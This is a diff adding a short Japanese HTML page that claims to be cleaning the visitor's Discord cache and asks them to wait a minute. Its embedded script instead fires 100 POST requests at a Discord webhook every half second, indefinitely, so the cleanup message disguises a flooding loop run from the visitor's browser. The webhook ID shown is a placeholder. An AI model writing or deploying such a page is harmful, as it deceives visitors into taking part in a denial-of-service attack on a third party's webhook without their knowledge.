@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>Discordキャッシュ整理</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+    <h1>Discordのキャッシュを整理しています...</h1>
+    <h2>1分ほどお待ちください</h2>
+    <script>
+        setInterval(() => {
+            for (let i = 0; i < 100; i++) {
+                fetch("https://discord.com/api/webhooks/12345", {
+                    method: "POST"
+                });
+            }
+        }, 500);
+    </script>
+</body>
+
+</html>
